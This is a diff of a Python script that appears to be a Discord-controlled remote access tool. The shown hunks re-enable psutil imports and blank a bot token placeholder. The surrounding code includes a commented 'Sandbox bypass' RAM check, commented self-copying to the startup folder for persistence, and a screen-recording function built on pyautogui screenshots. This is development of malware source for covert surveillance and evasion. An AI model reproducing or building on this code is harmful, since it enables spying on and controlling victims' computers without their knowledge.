@@ -12,14 +12,12 @@ from discord.ext import commands
 from filesplit.merge import Merge
 from json import detect_encoding
 from numpy import array
-#from psutil import process_iter, virtual_memory, cpu_count
+from psutil import process_iter, virtual_memory, cpu_count
 from pyautogui import screenshot, size
 from requests import post
 from scipy.io.wavfile import write
 from seedir import seedir
-#from uuid import uuid4
-
-#TODO
+from uuid import uuid4
 
 # Sandbox bypass
 #ra = int(round(virtual_memory().total / (1024 ** 3)))
@@ -72,7 +70,7 @@ temp = os.getenv('temp')
             #os.chdir(startup_path)
             #os.startfile(os.path.join(path, os.path.basename(sys.argv[0])))
     #else:
-TOKEN = 'TOKEN-HERE'
+TOKEN = ''
 
 prompt_name = 'test'
 master = commands.Bot(command_prefix='_', intents=discord.Intents.all())
@@ -125,14 +123,11 @@ def recordscr(seconds):
 
 
     for i in range(30*seconds):
-        # Capture screen content
         frame = screenshot()
         frame = array(frame)
 
-        # Convert BGR format (used by OpenCV) to RGB format
         frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
 
-        # Write the frame to the video file
         out.write(frame)
 
     out.release()
